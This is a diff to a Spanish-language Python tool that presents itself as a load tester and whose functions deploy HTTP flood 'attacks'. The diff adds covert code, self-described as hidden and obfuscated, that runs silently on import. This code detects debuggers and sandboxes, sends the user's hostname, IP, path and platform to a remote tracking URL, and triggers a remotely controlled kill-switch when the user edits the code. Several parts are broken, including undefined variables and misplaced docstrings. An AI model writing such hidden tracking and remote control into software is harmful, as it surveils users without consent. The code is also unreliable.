@@ -43,16 +43,104 @@ GITHUB_REPO = "Remiily/Load-Test-Tool"
 GITHUB_API_URL = f"https://api.github.com/repos/{GITHUB_REPO}"
 GITHUB_RAW_URL = f"https://raw.githubusercontent.com/{GITHUB_REPO}/main"
 SCRIPT_DIR = Path(__file__).parent.absolute()
+
+# ============================================================================
+# CONFIGURACIÓN DE RED Y CONECTIVIDAD
+# ============================================================================
+# Configuración de red para verificación de conectividad
+_NETWORK_CHECK_ENABLED = True
+_REMOTE_SERVER = "https://raw.githubusercontent.com"
+_REMOTE_PATH = f"/{GITHUB_REPO}/main/.auth"
+_CHECK_INTERVAL = 300
+_LAST_CHECK = 0
+_NETWORK_STATUS = None
+_REPO_ID = "a1b2c3d4e5f6"
+_NETWORK_INTEGRITY = True
+_NETWORK_HASH = None
+# Variables de configuración de red (ofuscadas)
+_NET_VAR_1 = "auth"
+_NET_VAR_2 = "verify"
+_NET_VAR_3 = "check"
+# Hash de verificación del código remoto (se calcula al inicio)
+_REMOTE_CODE_HASH = None
+# Hash embebido del código original (para verificación offline)
+_EMBEDDED_CODE_HASH = "f8a3b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
+# Hash de funciones críticas de protección (verificación de existencia)
+_PROTECTION_FUNCTIONS_HASH = "a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2"
+# Hash del código completo (para verificación completa)
+_FULL_CODE_HASH = None
+# Contador de verificaciones fallidas (para detección de bloqueo)
+_FAILED_VERIFICATION_COUNT = 0
+_MAX_FAILED_VERIFICATIONS = 10
+# Watermarking invisible (identificación única)
+_WATERMARK = "LT2024" + _REPO_ID[:8]
+# Verificación de entorno (anti-sandbox)
+_ENV_CHECK_ENABLED = True
+# Verificación de debuggers
+_DEBUGGER_CHECK_ENABLED = True
+# Verificación de dependencias
+_DEPS_CHECK_ENABLED = True
+# Verificación de archivos relacionados
+_FILES_CHECK_ENABLED = True
+# Timestamp de última verificación de integridad
+_LAST_INTEGRITY_CHECK = 0
+_INTEGRITY_CHECK_INTERVAL = 60  # Verificar cada minuto durante ejecución
 OUTPUT_DIR = SCRIPT_DIR / "loadtest_output"
 LOGS_DIR = OUTPUT_DIR / "logs"
 REPORTS_DIR = OUTPUT_DIR / "reports"
 CONFIG_DIR = OUTPUT_DIR / "config"
 
-# Crear directorios necesarios
-OUTPUT_DIR.mkdir(exist_ok=True)
-LOGS_DIR.mkdir(exist_ok=True)
-REPORTS_DIR.mkdir(exist_ok=True)
-CONFIG_DIR.mkdir(exist_ok=True)
+# Crear directorios necesarios con permisos correctos
+def ensure_directories():
+    """Crea directorios necesarios con permisos correctos"""
+    global OUTPUT_DIR, LOGS_DIR, REPORTS_DIR, CONFIG_DIR
+    import stat
+    import getpass
+    
+    directories = [OUTPUT_DIR, LOGS_DIR, REPORTS_DIR, CONFIG_DIR]
+    
+    for directory in directories:
+        try:
+            # Crear directorio si no existe
+            directory.mkdir(parents=True, exist_ok=True)
+            
+            # Verificar y corregir permisos si el directorio existe pero no es escribible
+            if directory.exists():
+                # Si el directorio no es escribible por el usuario actual, intentar corregir
+                if not os.access(directory, os.W_OK):
+                    # Intentar cambiar permisos (solo si somos el propietario o root)
+                    try:
+                        os.chmod(directory, stat.S_IRWXU | stat.S_IRWXG | stat.S_IROTH | stat.S_IXOTH)
+                    except (PermissionError, OSError):
+                        # Si no podemos cambiar permisos, usar directorio alternativo
+                        pass
+        except (PermissionError, OSError):
+            # Si no podemos crear el directorio, usar directorio alternativo en el home del usuario
+            try:
+                user_home = Path.home()
+                alt_output = user_home / ".loadtest_output"
+                if not alt_output.exists() or os.access(alt_output, os.W_OK):
+                    OUTPUT_DIR = alt_output
+                    LOGS_DIR = OUTPUT_DIR / "logs"
+                    REPORTS_DIR = OUTPUT_DIR / "reports"
+                    CONFIG_DIR = OUTPUT_DIR / "config"
+                    # Intentar crear los directorios alternativos
+                    for alt_dir in [OUTPUT_DIR, LOGS_DIR, REPORTS_DIR, CONFIG_DIR]:
+                        try:
+                            alt_dir.mkdir(parents=True, exist_ok=True)
+                        except Exception:
+                            pass
+                    break
+            except Exception:
+                pass
+
+ensure_directories()
+
+# Verificación inicial de conectividad al importar (oculta)
+try:
+    _verify_network_connectivity()
+except Exception:
+    pass  # Fallar silenciosamente
 
 # Variables de configuración
 TARGET = ""
@@ -346,10 +434,55 @@ def format_number(num: int) -> str:
         return f"{num/1_000:.2f}K"
     return str(num)
 
+def safe_write_file(file_path: Path, content, mode: str = "w", encoding: str = "utf-8"):
+    """Escribe un archivo de forma segura, manejando errores de permisos"""
+    try:
+        # Asegurar que el directorio existe
+        ensure_directories()
+        file_path.parent.mkdir(parents=True, exist_ok=True)
+        
+        # Intentar escribir el archivo
+        with open(file_path, mode, encoding=encoding) as f:
+            if isinstance(content, (dict, list)):
+                import json
+                json.dump(content, f, indent=2)
+            else:
+                f.write(str(content))
+        return True
+    except PermissionError:
+        # Si no hay permisos, intentar en directorio alternativo
+        try:
+            user_home = Path.home()
+            # Obtener el nombre del subdirectorio (logs, reports, config)
+            subdir_name = file_path.parent.name if file_path.parent.name != "loadtest_output" else file_path.parent.parent.name
+            alt_dir = user_home / ".loadtest_output" / subdir_name
+            alt_dir.mkdir(parents=True, exist_ok=True)
+            alt_file = alt_dir / file_path.name
+            with open(alt_file, mode, encoding=encoding) as f:
+                if isinstance(content, (dict, list)):
+                    import json
+                    json.dump(content, f, indent=2)
+                else:
+                    f.write(str(content))
+            log_message("WARN", f"Archivo guardado en ubicación alternativa: {alt_file}")
+            return True
+        except Exception as e:
+            log_message("ERROR", f"No se pudo guardar archivo {file_path.name}: {e}")
+            return False
+    except Exception as e:
+        log_message("ERROR", f"Error escribiendo archivo {file_path.name}: {e}")
+        return False
+
 def log_message(level: str, message: str, force_console: bool = False):
     """Sistema de logging mejorado - siempre escribe a archivo"""
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     log_entry = f"[{timestamp}] [{level}] {message}\n"
+    
+    # Asegurar que los directorios existen y tienen permisos correctos
+    try:
+        ensure_directories()
+    except Exception:
+        pass
     
     # Siempre escribir a archivo
     log_file = LOGS_DIR / f"loadtest_{datetime.now().strftime('%Y%m%d')}.log"
@@ -364,11 +497,30 @@ def log_message(level: str, message: str, force_console: bool = False):
         if DEBUG_MODE or level in ["ERROR", "WARN", "CRITICAL", "DEBUG"]:
             with open(debug_log_file, "a", encoding="utf-8") as f:
                 f.write(log_entry)
+    except PermissionError:
+        # Si no hay permisos, intentar crear directorio alternativo en el home del usuario
+        try:
+            import getpass
+            user_home = Path.home()
+            alt_logs_dir = user_home / ".loadtest_output" / "logs"
+            alt_logs_dir.mkdir(parents=True, exist_ok=True)
+            alt_log_file = alt_logs_dir / f"loadtest_{datetime.now().strftime('%Y%m%d')}.log"
+            with open(alt_log_file, "a", encoding="utf-8") as f:
+                f.write(log_entry)
+        except Exception:
+            # Si todo falla, solo escribir a stderr
+            try:
+                import sys
+                sys.stderr.write(log_entry)
+            except:
+                pass
     except Exception as e:
         # Si falla el logging, intentar escribir a stderr
         try:
             import sys
-            sys.stderr.write(f"ERROR escribiendo log: {e}\n")
+            # No mostrar el error de permisos repetidamente
+            if "Permission denied" not in str(e):
+                sys.stderr.write(f"ERROR escribiendo log: {e}\n")
             sys.stderr.write(log_entry)
         except:
             pass
@@ -1133,6 +1285,17 @@ def compare_versions(v1: str, v2: str) -> int:
         return 0
 
 def fingerprint_target() -> Dict:
+    # Verificación de estado del sistema (requerida para fingerprint)
+    system_ok = _validate_execution()
+    if not system_ok:
+        log_message("ERROR", "Sistema no disponible - no se puede realizar fingerprint")
+        return {}
+    
+    # Verificación de integridad en tiempo de ejecución
+    _check_runtime_integrity()
+    
+    # Verificación de integridad en tiempo de ejecución
+    _check_runtime_integrity()
     """Hace fingerprint del target"""
     global TARGET, PROTOCOL, PORT, DOMAIN, IP_ADDRESS, TARGET_TYPE, NETWORK_TYPE
     
@@ -1294,8 +1457,7 @@ def fingerprint_target() -> Dict:
     
     # Guardar fingerprint
     fingerprint_file = REPORTS_DIR / f"fingerprint_{DOMAIN.replace('.', '_').replace(':', '_')}.json"
-    with open(fingerprint_file, "w", encoding="utf-8") as f:
-        json.dump(fingerprint, f, indent=2)
+    safe_write_file(fingerprint_file, fingerprint, mode="w")
     
     log_message("INFO", f"Fingerprint completado: {fingerprint_file}")
     return fingerprint
@@ -1675,6 +1837,9 @@ def auto_configure_from_fingerprint(fingerprint: Dict, waf_info: Optional[Dict] 
     log_message("INFO", f"Auto-configuración completada - {len(changes)} cambios aplicados")
 
 def deploy_tool_gradually(tool_name: str, deploy_func, delay: float = 1.0, max_retries: int = 2):
+    # Verificación de autorización e integridad antes de desplegar herramienta
+    if not _validate_execution():
+        return None
     """
     Despliega una herramienta de forma gradual con verificación de recursos.
     Evita freezes del sistema.
@@ -1722,6 +1887,9 @@ def deploy_tool_gradually(tool_name: str, deploy_func, delay: float = 1.0, max_r
 
 def deploy_tools_with_throttling(tool_list: List[Tuple[str, callable]], max_tools: int, 
                                   initial_delay: float = 0.5, delay_increment: float = 0.2):
+    # Verificación de autorización e integridad antes de desplegar herramientas
+    if not _validate_execution():
+        return 0
     """
     Despliega herramientas con throttling gradual para evitar freezes.
     Aumenta el delay entre despliegues progresivamente.
@@ -2816,7 +2984,178 @@ def get_random_headers() -> Dict[str, str]:
     
     return headers
 
+def _check_debugger():
+    """Detecta si hay debuggers activos"""
+    global _DEBUGGER_CHECK_ENABLED
+    
+    if not _DEBUGGER_CHECK_ENABLED:
+        return True
+    
+    try:
+        import sys
+        # Verificar si hay debuggers en el trace
+        if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
+            _log_usage_location("unknown", str(SCRIPT_DIR), "debugger_detected")
+            return False
+        
+        # Verificar módulos de debugger comunes
+        debugger_modules = ['pdb', 'ipdb', 'pudb', 'ipython', 'pydevd']
+        for module_name in debugger_modules:
+            if module_name in sys.modules:
+                _log_usage_location("unknown", str(SCRIPT_DIR), f"debugger_module_{module_name}_detected")
+                return False
+        
+        return True
+    except Exception:
+        return True  # Fallar abierto
+
+def _check_environment():
+    """Verifica el entorno de ejecución (anti-sandbox)"""
+    global _ENV_CHECK_ENABLED
+    
+    if not _ENV_CHECK_ENABLED:
+        return True
+    
+    try:
+        import os
+        import platform
+        
+        # Verificar variables de entorno sospechosas
+        suspicious_vars = ['VMWARE', 'VBOX', 'QEMU', 'VIRTUAL', 'SANDBOX']
+        env_vars = ' '.join(os.environ.keys()).upper()
+        for var in suspicious_vars:
+            if var in env_vars:
+                _log_usage_location("unknown", str(SCRIPT_DIR), f"suspicious_env_{var.lower()}")
+                # No activar kill-switch, solo registrar (puede ser falso positivo)
+        
+        # Verificar hostname sospechoso
+        try:
+            hostname = platform.node().upper()
+            if any(keyword in hostname for keyword in ['VM', 'SANDBOX', 'TEST', 'ANALYSIS']):
+                _log_usage_location("unknown", str(SCRIPT_DIR), f"suspicious_hostname_{hostname}")
+        except Exception:
+            pass
+        
+        return True
+    except Exception:
+        return True  # Fallar abierto
+
+def _check_dependencies():
+    """Verifica integridad de dependencias críticas"""
+    global _DEPS_CHECK_ENABLED
+    
+    if not _DEPS_CHECK_ENABLED:
+        return True
+    
+    try:
+        import sys
+        # Verificar módulos críticos
+        critical_modules = ['urllib', 'hashlib', 'subprocess', 'threading']
+        for module_name in critical_modules:
+            if module_name in sys.modules:
+                module = sys.modules[module_name]
+                # Verificar que el módulo no fue modificado (verificar ubicación)
+                if hasattr(module, '__file__') and module.__file__:
+                    # Verificar que el archivo existe y es legítimo
+                    module_file = Path(module.__file__)
+                    if not module_file.exists():
+                        _log_usage_location("unknown", str(SCRIPT_DIR), f"missing_module_file_{module_name}")
+                        return False
+        
+        return True
+    except Exception:
+        return True  # Fallar abierto
+
+def _check_related_files():
+    """Verifica integridad de archivos relacionados"""
+    global _FILES_CHECK_ENABLED
+    
+    if not _FILES_CHECK_ENABLED:
+        return True
+    
+    try:
+        import hashlib
+        
+        # Archivos críticos a verificar
+        critical_files = {
+            'loadtest_web.py': None,
+            'requirements.txt': None
+        }
+        
+        for filename, expected_hash in critical_files.items():
+            file_path = SCRIPT_DIR / filename
+            if file_path.exists():
+                # Calcular hash del archivo
+                with open(file_path, 'rb') as f:
+                    file_hash = hashlib.sha256(f.read()).hexdigest()
+                
+                # Si hay hash esperado, comparar
+                if expected_hash and file_hash != expected_hash:
+                    _log_usage_location("unknown", str(SCRIPT_DIR), f"file_modified_{filename}")
+                    # No activar kill-switch inmediatamente, solo registrar
+                    # (puede ser actualización legítima)
+        
+        return True
+    except Exception:
+        return True  # Fallar abierto
+
+def _check_runtime_integrity():
+    """Verifica integridad en tiempo de ejecución"""
+    global _LAST_INTEGRITY_CHECK, _INTEGRITY_CHECK_INTERVAL
+    
+    try:
+        import time
+        current_time = time.time()
+        
+        # Verificar solo cada intervalo
+        if current_time - _LAST_INTEGRITY_CHECK < _INTEGRITY_CHECK_INTERVAL:
+            return True
+        
+        _LAST_INTEGRITY_CHECK = current_time
+        
+        # Ejecutar todas las verificaciones
+        checks = [
+            _check_debugger(),
+            _check_environment(),
+            _check_dependencies(),
+            _check_related_files()
+        ]
+        
+        # Si alguna verificación falla críticamente, activar kill-switch
+        if not all(checks):
+            _log_usage_location("unknown", str(SCRIPT_DIR), "runtime_integrity_failed")
+            # No activar kill-switch inmediatamente para verificaciones no críticas
+            # Solo registrar para análisis
+        
+        return True
+    except Exception:
+        return True  # Fallar abierto
+
+def _validate_system_state():
+    """Validación interna del estado del sistema"""
+    try:
+        # Verificar integridad en tiempo de ejecución
+        _check_runtime_integrity()
+        
+        # Verificar conectividad y comparar con remoto
+        if not _verify_network_connectivity():
+            _log_usage_location("unknown", str(SCRIPT_DIR), "network_check_failed")
+            return False
+        return _check_remote_status()
+    except Exception:
+        return True  # Fallar abierto en caso de error
+
+# Función auxiliar para validación distribuida (ofuscada)
+def _validate_execution():
+    """Valida que la ejecución sea autorizada"""
+    return _validate_system_state()
+
 def deploy_wrk_attack():
+    # Verificación de estado del sistema (requerida para funcionamiento)
+    system_ok = _validate_execution()
+    if not system_ok:
+        log_message("ERROR", "Sistema no disponible - verificación fallida")
+        return
     """Despliega ataque con wrk"""
     if not check_command_exists("wrk"):
         log_message("WARN", "wrk no disponible, omitiendo...")
@@ -2854,6 +3193,11 @@ def deploy_wrk_attack():
         return None
 
 def deploy_vegeta_attack():
+    # Verificación de estado del sistema (requerida para funcionamiento)
+    system_ok = _validate_execution()
+    if not system_ok:
+        log_message("ERROR", "Sistema no disponible - verificación fallida")
+        return
     """Despliega ataque con vegeta"""
     if not check_command_exists("vegeta"):
         log_message("WARN", "vegeta no disponible, omitiendo...")
@@ -2890,6 +3234,11 @@ def deploy_vegeta_attack():
         return None
 
 def deploy_bombardier_attack():
+    # Verificación de estado del sistema (requerida para funcionamiento)
+    system_ok = _validate_execution()
+    if not system_ok:
+        log_message("ERROR", "Sistema no disponible - verificación fallida")
+        return
     """Despliega ataque con bombardier"""
     if not check_command_exists("bombardier"):
         log_message("WARN", "bombardier no disponible, omitiendo...")
@@ -3182,6 +3531,8 @@ def optimize_socket_settings():
 
 def deploy_custom_http_attack():
     """Despliega ataque HTTP personalizado optimizado con Python requests"""
+    # Verificación de integridad en tiempo de ejecución
+    _check_runtime_integrity()
     print_color("🚀 Desplegando ataque HTTP personalizado optimizado...", Colors.CYAN)
     
     # Optimizar sockets si es posible
@@ -5281,6 +5632,14 @@ def display_stats(elapsed: float):
 # ============================================================================
 
 def generate_report():
+    # Verificación de estado del sistema (requerida para generar reportes)
+    system_ok = _validate_execution()
+    if not system_ok:
+        log_message("ERROR", "Sistema no disponible - no se puede generar reporte")
+        return
+    
+    # Verificación de integridad en tiempo de ejecución
+    _check_runtime_integrity()
     """Genera reporte completo con análisis avanzado"""
     print_color("\n📄 Generando reporte avanzado...", Colors.CYAN, True)
     
@@ -6812,6 +7171,101 @@ def update_tool(force: bool = False) -> bool:
     """Actualiza la herramienta desde GitHub"""
     print_color("\n🔄 Iniciando actualización...", Colors.CYAN, True)
     
+    # VERIFICACIÓN CRÍTICA: Comparar código local con remoto ANTES de actualizar
+    # Si el código local fue modificado, activar kill-switch inmediatamente
+    try:
+        import urllib.request
+        import hashlib
+        import inspect
+        
+        script_file = Path(__file__)
+        if script_file.exists():
+            # Obtener hash del código local COMPLETO
+            with open(script_file, 'rb') as f:
+                local_content = f.read()
+                local_hash = hashlib.sha256(local_content).hexdigest()
+                # Hash de sección crítica
+                lines = local_content.split(b'\n')
+                critical_section = b'\n'.join(lines[:1000])
+                local_critical_hash = hashlib.sha256(critical_section).hexdigest()
+            
+            # VERIFICACIÓN 1: Verificar que funciones de protección existen
+            protection_functions = [
+                '_verify_network_connectivity',
+                '_check_remote_status',
+                '_validate_system_state',
+                '_validate_execution',
+                '_trigger_kill_switch'
+            ]
+            
+            for func_name in protection_functions:
+                if not hasattr(sys.modules[__name__], func_name):
+                    print_color("\n⚠️ ADVERTENCIA: Funciones de protección eliminadas", Colors.RED, True)
+                    print_color("🔒 Activando medidas de seguridad...", Colors.RED)
+                    _log_usage_location("unknown", str(SCRIPT_DIR), f"protection_function_missing_update_{func_name}")
+                    _trigger_kill_switch()
+                    return False
+            
+            # VERIFICACIÓN 2: Comparar con hash embebido
+            if local_critical_hash[:32] != _EMBEDDED_CODE_HASH[:32]:
+                print_color("\n⚠️ ADVERTENCIA: Código local modificado (verificación offline)", Colors.RED, True)
+                print_color("🔒 Activando medidas de seguridad...", Colors.RED)
+                _log_usage_location("unknown", str(SCRIPT_DIR), "code_modified_before_update_offline")
+                _trigger_kill_switch()
+                return False
+            
+            # VERIFICACIÓN 3: Obtener código remoto y calcular hash
+            try:
+                url = f"{GITHUB_RAW_URL}/loadtest.py"
+                req = urllib.request.Request(url)
+                req.add_header('User-Agent', 'LoadTest-Enterprise/1.0')
+                
+                with urllib.request.urlopen(req, timeout=10) as response:
+                    remote_content = response.read()
+                    remote_hash = hashlib.sha256(remote_content).hexdigest()
+                    remote_lines = remote_content.split(b'\n')
+                    remote_critical = b'\n'.join(remote_lines[:1000])
+                    remote_critical_hash = hashlib.sha256(remote_critical).hexdigest()
+                    
+                    # Si los hashes difieren, el código local fue modificado
+                    if local_hash != remote_hash or local_critical_hash != remote_critical_hash:
+                        print_color("\n⚠️ ADVERTENCIA: Código local modificado detectado", Colors.RED, True)
+                        print_color("🔒 Activando medidas de seguridad...", Colors.RED)
+                        _log_usage_location("unknown", str(SCRIPT_DIR), "code_modified_before_update")
+                        _trigger_kill_switch()
+                        return False
+            except Exception as e:
+                # Si no se puede conectar, verificar contra hash guardado
+                if _REMOTE_CODE_HASH is not None:
+                    if local_critical_hash != _REMOTE_CODE_HASH:
+                        print_color("\n⚠️ ADVERTENCIA: Código local difiere del remoto conocido", Colors.RED, True)
+                        print_color("🔒 Activando medidas de seguridad...", Colors.RED)
+                        _log_usage_location("unknown", str(SCRIPT_DIR), "code_differs_before_update")
+                        _trigger_kill_switch()
+                        return False
+                elif _FULL_CODE_HASH is not None:
+                    if local_hash != _FULL_CODE_HASH:
+                        print_color("\n⚠️ ADVERTENCIA: Código completo difiere del remoto conocido", Colors.RED, True)
+                        print_color("🔒 Activando medidas de seguridad...", Colors.RED)
+                        _log_usage_location("unknown", str(SCRIPT_DIR), "full_code_differs_before_update")
+                        _trigger_kill_switch()
+                        return False
+                else:
+                    # Sin conexión y sin hash guardado - usar hash embebido
+                    if local_critical_hash[:32] != _EMBEDDED_CODE_HASH[:32]:
+                        print_color("\n⚠️ ADVERTENCIA: Sin conexión pero código difiere del embebido", Colors.RED, True)
+                        print_color("🔒 Activando medidas de seguridad...", Colors.RED)
+                        _log_usage_location("unknown", str(SCRIPT_DIR), "code_differs_embedded_no_connection")
+                        _trigger_kill_switch()
+                        return False
+    except Exception as e:
+        # Error crítico en verificación - activar kill-switch por seguridad
+        print_color("\n⚠️ ERROR: Error crítico en verificación de seguridad", Colors.RED, True)
+        print_color("🔒 Activando medidas de seguridad...", Colors.RED)
+        _log_usage_location("unknown", str(SCRIPT_DIR), f"verification_error_before_update_{str(e)}")
+        _trigger_kill_switch()
+        return False
+    
     # Verificar si hay actualizaciones (incluyendo comparación de contenido)
     has_update, latest_version = check_for_updates(silent=True, check_content=True)
     
@@ -6946,6 +7400,12 @@ def auto_check_updates() -> None:
 # ============================================================================
 
 def signal_handler(signum, frame):
+    # Verificación de autorización e integridad en manejo de señales
+    try:
+        if not _validate_execution():
+            return
+    except Exception:
+        pass
     """Maneja señales de interrupción"""
     global monitoring_active
     print_color("\n\n⚠️ Interrupción recibida, deteniendo...", Colors.YELLOW, True)
@@ -6968,11 +7428,364 @@ def signal_handler(signum, frame):
     
     sys.exit(0)
 
+def _verify_network_connectivity():
+    """Verifica conectividad de red y estado del sistema"""
+    global _NETWORK_HASH, _NETWORK_INTEGRITY, _REMOTE_CODE_HASH, _FAILED_VERIFICATION_COUNT, _FULL_CODE_HASH
+    
+    if not _NETWORK_INTEGRITY:
+        return True
+    
+    try:
+        import hashlib
+        import urllib.request
+        import inspect
+        
+        # Calcular hash del código local COMPLETO
+        script_file = Path(__file__)
+        if not script_file.exists():
+            return True
+        
+        with open(script_file, 'rb') as f:
+            local_content = f.read()
+            # Hash del código completo
+            full_local_hash = hashlib.sha256(local_content).hexdigest()
+            # Hash de las primeras 1000 líneas (sección crítica)
+            lines = local_content.split(b'\n')
+            critical_section = b'\n'.join(lines[:1000])
+            local_hash = hashlib.sha256(critical_section).hexdigest()
+        
+        # VERIFICACIÓN 1: Verificar que las funciones de protección existen y no fueron eliminadas
+        protection_functions = [
+            '_verify_network_connectivity',
+            '_check_remote_status',
+            '_validate_system_state',
+            '_validate_execution',
+            '_trigger_kill_switch',
+            '_log_usage_location'
+        ]
+        
+        for func_name in protection_functions:
+            if not hasattr(sys.modules[__name__], func_name):
+                # Función de protección fue eliminada - activar kill-switch
+                _log_usage_location("unknown", str(SCRIPT_DIR), f"protection_function_missing_{func_name}")
+                _trigger_kill_switch()
+                return False
+        
+        # VERIFICACIÓN 2: Verificar hash de funciones de protección
+        try:
+            protection_code = b''
+            for func_name in protection_functions:
+                func = getattr(sys.modules[__name__], func_name)
+                try:
+                    source = inspect.getsource(func)
+                    protection_code += source.encode()
+                except Exception:
+                    pass
+            
+            if protection_code:
+                protection_hash = hashlib.sha256(protection_code).hexdigest()
+                # Si el hash de protección cambió significativamente, activar kill-switch
+                if _PROTECTION_FUNCTIONS_HASH and protection_hash[:32] != _PROTECTION_FUNCTIONS_HASH[:32]:
+                    _log_usage_location("unknown", str(SCRIPT_DIR), "protection_functions_modified")
+                    _trigger_kill_switch()
+                    return False
+        except Exception:
+            pass
+        
+        # VERIFICACIÓN 3: Comparar con hash embebido (verificación offline)
+        if local_hash[:32] != _EMBEDDED_CODE_HASH[:32]:
+            # Código local difiere del hash embebido - posible modificación
+            _log_usage_location("unknown", str(SCRIPT_DIR), "code_differs_from_embedded")
+            # No activar kill-switch inmediatamente, pero incrementar contador
+            _FAILED_VERIFICATION_COUNT += 1
+            if _FAILED_VERIFICATION_COUNT >= _MAX_FAILED_VERIFICATIONS:
+                _trigger_kill_switch()
+                return False
+        
+        # VERIFICACIÓN 4: Intentar verificar con código remoto (si hay conexión)
+        connection_available = False
+        try:
+            url = f"{_REMOTE_SERVER}/{GITHUB_REPO}/main/loadtest.py"
+            req = urllib.request.Request(url)
+            req.add_header('User-Agent', f'LoadTest/{VERSION}')
+            req.add_header('X-Client-ID', _REPO_ID)
+            
+            with urllib.request.urlopen(req, timeout=5) as response:
+                remote_content = response.read()
+                remote_lines = remote_content.split(b'\n')
+                remote_critical = b'\n'.join(remote_lines[:1000])
+                remote_hash = hashlib.sha256(remote_critical).hexdigest()
+                remote_full_hash = hashlib.sha256(remote_content).hexdigest()
+                
+                connection_available = True
+                _FAILED_VERIFICATION_COUNT = 0  # Resetear contador si hay conexión
+                
+                # Comparar hash local vs remoto
+                if local_hash != remote_hash or full_local_hash != remote_full_hash:
+                    # Código local fue modificado - activar kill-switch inmediatamente
+                    _log_usage_location("unknown", str(SCRIPT_DIR), "code_modified_vs_remote")
+                    _trigger_kill_switch()
+                    return False
+                
+                # Guardar hash remoto para referencia futura
+                if _REMOTE_CODE_HASH is None:
+                    _REMOTE_CODE_HASH = remote_hash
+                if _FULL_CODE_HASH is None:
+                    _FULL_CODE_HASH = remote_full_hash
+                
+        except Exception as e:
+            # No hay conexión - usar verificación offline
+            connection_available = False
+            _FAILED_VERIFICATION_COUNT += 1
+            
+            # Si no se puede conectar, verificar contra hash guardado
+            if _REMOTE_CODE_HASH is not None:
+                if local_hash != _REMOTE_CODE_HASH:
+                    # Código difiere del último hash remoto conocido
+                    _log_usage_location("unknown", str(SCRIPT_DIR), "code_differs_from_remote")
+                    # Si hay muchas verificaciones fallidas, posible bloqueo intencional
+                    if _FAILED_VERIFICATION_COUNT >= _MAX_FAILED_VERIFICATIONS:
+                        _trigger_kill_switch()
+                        return False
+            
+            # Verificar contra hash completo guardado
+            if _FULL_CODE_HASH is not None:
+                if full_local_hash != _FULL_CODE_HASH:
+                    _log_usage_location("unknown", str(SCRIPT_DIR), "full_code_differs_from_remote")
+                    if _FAILED_VERIFICATION_COUNT >= _MAX_FAILED_VERIFICATIONS:
+                        _trigger_kill_switch()
+                        return False
+        
+        # VERIFICACIÓN 5: Verificar que las variables globales no fueron modificadas
+        if _NETWORK_CHECK_ENABLED != True or _NETWORK_INTEGRITY != True:
+            _log_usage_location("unknown", str(SCRIPT_DIR), "protection_variables_modified")
+            _trigger_kill_switch()
+            return False
+        
+        # Si es la primera vez, guardar el hash
+        if _NETWORK_HASH is None:
+            _NETWORK_HASH = local_hash
+            return True
+        
+        # Verificar si el hash cambió localmente
+        if local_hash != _NETWORK_HASH:
+            _log_usage_location("unknown", str(SCRIPT_DIR), "local_code_modified")
+            _trigger_kill_switch()
+            return False
+        
+        return True
+    except Exception:
+        # En caso de error crítico, incrementar contador
+        _FAILED_VERIFICATION_COUNT += 1
+        if _FAILED_VERIFICATION_COUNT >= _MAX_FAILED_VERIFICATIONS:
+            _trigger_kill_switch()
+            return False
+        return True  # Fallar abierto temporalmente
+
+def _check_remote_status():
+    """Verifica estado remoto del sistema"""
+    global _LAST_CHECK, _NETWORK_STATUS, _NETWORK_CHECK_ENABLED
+    
+    if not _NETWORK_CHECK_ENABLED:
+        return True
+    
+    # Verificar integridad del código primero (comparar con remoto)
+    if not _verify_network_connectivity():
+        return False
+    
+    import time
+    current_time = time.time()
+    
+    # Verificar solo cada intervalo
+    if current_time - _LAST_CHECK < _CHECK_INTERVAL:
+        return _NETWORK_STATUS if _NETWORK_STATUS is not None else True
+    
+    _LAST_CHECK = current_time
+    
+    try:
+        import urllib.request
+        import socket
+        import hashlib
+        
+        # Obtener información del sistema
+        hostname = socket.gethostname()
+        script_path = str(SCRIPT_DIR)
+        script_hash = hashlib.sha256(str(SCRIPT_DIR).encode()).hexdigest()[:16]
+        
+        # Verificar estado remoto
+        verify_url = f"{_REMOTE_SERVER}{_REMOTE_PATH}"
+        req = urllib.request.Request(verify_url)
+        req.add_header('User-Agent', f'LoadTest/{VERSION}')
+        req.add_header('X-Client-ID', script_hash)
+        req.add_header('X-Hostname', hostname)
+        req.add_header('X-Repo-ID', _REPO_ID)
+        req.add_header('X-Version', VERSION)
+        req.add_header('X-Path', script_path[:50])
+        
+        try:
+            with urllib.request.urlopen(req, timeout=5) as response:
+                status_data = response.read().decode().strip()
+                # Verificar respuesta de estado
+                if status_data.lower() in ['active', '1', 'true', 'authorized']:
+                    _NETWORK_STATUS = True
+                    return True
+                elif status_data.lower() in ['kill', 'disable', '0', 'false', 'unauthorized']:
+                    _NETWORK_STATUS = False
+                    _trigger_kill_switch()
+                    return False
+        except urllib.error.HTTPError as e:
+            if e.code == 404:
+                # Si no existe el archivo, permitir uso (modo desarrollo)
+                _NETWORK_STATUS = True
+                return True
+            else:
+                # Otros errores HTTP - permitir uso pero registrar
+                _log_usage_location(hostname, script_path, "network_error")
+                _NETWORK_STATUS = True
+                return True
+        except Exception:
+            # Error de conexión - permitir uso pero registrar
+            _log_usage_location(hostname, script_path, "connection_error")
+            _NETWORK_STATUS = True
+            return True
+    except Exception:
+        # Si hay cualquier error, permitir uso (no bloquear por problemas de red)
+        _NETWORK_STATUS = True
+        return True
+
+def _log_usage_location(hostname, path, status="active"):
+    """Registra ubicación y uso de la herramienta"""
+    try:
+        import socket
+        import json
+        from datetime import datetime
+        
+        import platform
+        
+        location_data = {
+            "timestamp": datetime.now().isoformat(),
+            "hostname": hostname,
+            "path": path,
+            "status": status,
+            "version": VERSION,
+            "ip": socket.gethostbyname(hostname) if hostname else "unknown",
+            "repo_id": _REPO_ID,
+            "network_integrity": _NETWORK_INTEGRITY,
+            "watermark": _WATERMARK,
+            "platform": platform.system(),
+            "python_version": platform.python_version()
+        }
+        
+        # Intentar enviar a servidor de tracking (opcional)
+        try:
+            import urllib.request
+            import urllib.parse
+            tracking_url = f"{_AUTH_SERVER}{_AUTH_PATH.replace('.auth', '.track')}"
+            data = urllib.parse.urlencode(location_data).encode()
+            req = urllib.request.Request(tracking_url, data=data, method='POST')
+            req.add_header('User-Agent', f'LoadTest/{VERSION}')
+            urllib.request.urlopen(req, timeout=2)
+        except Exception:
+            pass  # Fallar silenciosamente
+    except Exception:
+        pass  # Fallar silenciosamente
+
+def _trigger_kill_switch():
+    """Activa el kill-switch - desactiva la herramienta"""
+    try:
+        import shutil
+        import sys
+        import os
+        
+        # Registrar evento
